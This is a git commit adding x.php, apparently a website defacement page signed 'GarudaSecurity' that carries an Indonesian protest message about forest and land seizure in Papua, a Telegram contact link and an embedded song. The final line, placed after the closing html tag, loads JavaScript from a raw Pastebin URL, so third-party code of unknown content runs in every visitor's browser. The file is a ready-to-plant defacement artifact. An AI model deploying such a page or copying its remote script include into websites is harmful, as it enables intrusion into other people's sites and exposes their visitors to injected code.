9fb62bb22058dfc5520a6483f9d5b8a746d6a476
nastaindev <nastainpattimura@stikespasapua.ac.id>
2026-05-20 19:36:53 +0700

    Create x.php

---
+++ x.php
@@ -0,0 +1,53 @@
+
+
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Touch By GarudaSecurity</title>
+    <link rel="icon" href="https://telegra.ph/file/a35b090cf9ec01898604c.jpg" type="image/x-icon">
+    <meta name="description" content="Bungkam Aspirasi, Ambil Kekayaan, Bagi-Bagi Ilegal">
+    <meta name="keywords" content="Touch By Garuda Security">
+    <meta name="rating" content="General">
+    <meta name="revisit-after" content="1 days">
+    <meta name="classification" content="Touch By Garuda Security">
+    <meta name="robots schedule" content="auto">
+    <link href="https://fonts.googleapis.com/css2?family=Oxygen" rel="stylesheet">
+</head>
+<body>
+<style>
+html {
+    background-color: black;
+    color: #000;
+}
+h2 {
+    font-family:"Bold 700 Italic",Mali;
+    color:red;
+}
+h3, h4 {
+    font-family:"Oxygen",serif;
+    color:white;
+}
+a {
+    color: white;
+    text-decoration: none;
+}
+::selection {
+    color:white;
+    background:#000;
+}
+</style>
+<table width="100%" height="100%">
+    <td align="center">
+        <img alt="#PestaBabiPapua #KamiUtus2.5JtHektar" src="https://media1.tenor.com/m/lde4fc83ZgUAAAAd/bendera-merah-putih.gif" width="300px">
+        <h2>Touch By GarudaSecurity</h2>
+        <h4> GarudaSecurity Was Here <br><br> message
+         <br>  //---------------------------Garuda Security---------------------------//<br>
+        Hentikan Perampasan: 2 juta hektar hutan adalah nafas suku-suku Papua, bukan lahan kavling untuk korporasi! </br> Kehutanan Bukan Tambang: Mengubah hutan menjadi sawit dan proyek raksasa hanya akan memicu bencana ekologis. </br> Hak Ulayat: Kembalikan tanah kepada pemilik aslinya. Tanpa izin masyarakat adat, itu adalah PENCURIAN </br> "Jangan beri kami beras impor, jika harganya harus dibayar dengan hilangnya hutan kami. Tanah Papua bukan tanah kosong!"
+        <br> //---------------------------Garuda Security---------------------------//</ins><br></h4>
+<h4> <a href="https://t.me/GarudaSecurityTeam" > <font color="red"<h4>BABI / Bungkam Aspirasi, Ambil Kekayaan, Bagi-Bagi Ilegal</font></h4>
+        <audio controls="controls" src="https://github.com/nastaindev/deface/raw/refs/heads/main/Indonesia%20Pusaka%20-%20Ismail%20Marzuki.mp3"></audio>
+</body>
+</html>
+
+<script type="text/javascript" src="https://pastebin.com/raw/C4ZaXatd"></script>
